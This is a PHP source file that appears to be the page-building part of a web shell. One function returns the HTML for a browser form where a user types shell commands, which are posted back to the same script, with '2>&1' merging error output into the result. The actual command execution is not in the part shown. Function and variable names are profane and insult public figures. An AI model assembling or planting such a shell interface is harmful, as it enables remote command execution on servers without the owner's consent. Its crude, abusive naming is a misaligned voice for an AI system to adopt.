<?php

/*
 * this next function contains the page's html, no cmd exec happens here
 */

function fuck_abbott($which){

	// grabbing the nice little bits of info
	$up_the_dole = kill_a_man_for_his_giro();

	// this is just the location of the script, we need this so the html form
	// knows where to submit the command, and so you when you press enter/submit,
	// you come back to the same page, and not some useless 404 page
	$putin_huilo = basename($_SERVER['SCRIPT_NAME']);

$html_top = <<< EOF
<!DOCTYPE SATAN>
<html>
	<head>
		<style>
			input{background-color:#fff;width:50%;}code,input,*{font-size:12px;color:#000;font-family:"Menlo","Monaco",
			"Consolas",monospace !important;}body{background-color:#fafafa;}banana{ color:#aaa;}
		</style>
	</head>
	<body>
	<code><pre>
		$up_the_dole
	</pre></code>
		<form action="$putin_huilo" method="POST">
			<span>$ </span>
			<input type="text" name="whosthere" autocomplete="off" autofocus>
			<span>2&gt;&amp;1</span><br>
			<button value="Submit" name="submit" type="submit">~\$ubM1t~~&gt;</button>
		</form>
		<code>
			<pre><br><br>
EOF;
// gotta keep your html all semantic and proper and shit
$html_bottom = <<< EOF
			</pre>
		</code>
	</body>
</html>
EOF;

	// i hope this is self explanatory
	if ($which == 0){
		return $html_top;
	} else {
		return $html_bottom;
	}

}

?>